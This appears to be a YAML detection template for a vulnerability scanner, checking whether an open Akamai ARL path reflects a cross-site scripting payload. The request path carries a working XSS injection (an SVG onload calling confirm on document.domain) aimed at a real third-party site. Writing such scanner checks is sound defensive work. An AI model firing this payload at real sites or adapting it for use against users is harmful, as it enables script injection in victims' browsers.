id: "akamai-arl-xss"
name: "Open Akamai ARL - Cross-Site Scripting"
severity: "high"
description: "Open Akamai ARL contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site."
tech:
  - "generic"
tags:
  - "akamai"
  - "xss"
  - "misconfig"
  - "vuln"
reference: "https://github.com/war-and-code/akamai-arl-hack"
spaExclusion: true
request:
  method: "GET"
  path: "/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "\"><svg onload=confirm(document.domain)>"
      - "Suggestions for improving the results"
    condition: "and"
  - type: "word"
    part: "header"
    words:
      - "text/html"
